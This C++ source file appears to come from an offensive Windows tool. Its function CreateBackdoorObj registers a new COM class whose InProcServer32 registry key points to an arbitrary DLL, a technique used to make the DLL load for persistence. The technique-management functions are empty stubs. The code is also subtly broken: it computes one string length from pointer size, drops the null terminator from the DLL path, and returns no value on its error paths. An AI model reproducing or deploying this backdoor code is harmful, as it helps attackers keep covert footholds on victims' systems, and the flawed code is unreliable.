#include "reg.h"

/*
#define HKCU 0
#define HKCR 1
*/


namespace reg {


	GUID CreateBackdoorObj(BYTE Type, std::wstring DllPath) {

		LSTATUS status = NULL;
		HKEY hkResult = NULL;
		HKEY hKey = (Type) ? HKEY_CLASSES_ROOT : HKEY_CURRENT_USER;
		GUID objGuid = { NULL };
		HRESULT hResult = NULL;
		OLECHAR* guidString;
		DWORD dwKeyRights = KEY_READ | KEY_WRITE | KEY_SET_VALUE;
		
		hResult = CoCreateGuid(&objGuid);
		if (hResult == S_OK) {

			hResult = StringFromCLSID(objGuid, &guidString); // need to check this
			std::wstring subKey = L"CLSID\\" + std::wstring(guidString) + L"\\InProcServer32";
			CoTaskMemFree(guidString);



			status = RegCreateKeyExW(hKey, subKey.c_str(), NULL, NULL, REG_OPTION_NON_VOLATILE, dwKeyRights, NULL, &hkResult, NULL);
			if (status == ERROR_SUCCESS) {
				
				status = RegSetValueExW(hkResult, NULL, NULL, REG_SZ, (const BYTE *)DllPath.c_str(), DllPath.size() * 2 );

				if (status == ERROR_SUCCESS) {
				
					const WCHAR* ThreadingModel = L"Apartment";
					status = RegSetValueExW(hkResult, L"ThreadingModel", NULL, REG_SZ, (const BYTE *)ThreadingModel, sizeof(ThreadingModel) * 2 + 2);

					if (status == ERROR_SUCCESS) {
						
						return objGuid;

					}
					else {

						// error adding reg value (ThreadingModel)

					}

				}
				else {
					
					// error adding reg value (DLL Path)


				}

			}
			else {

				// error creating reg key


			}

		}
		else {

			// error generating GUID

		}




	}
	BOOL AddTechnique(DWORD type, _In_opt_ WCHAR* ext) {

		return TRUE;



	}
	BOOL RemoveTechnique(DWORD type) {


		return TRUE;

	}

}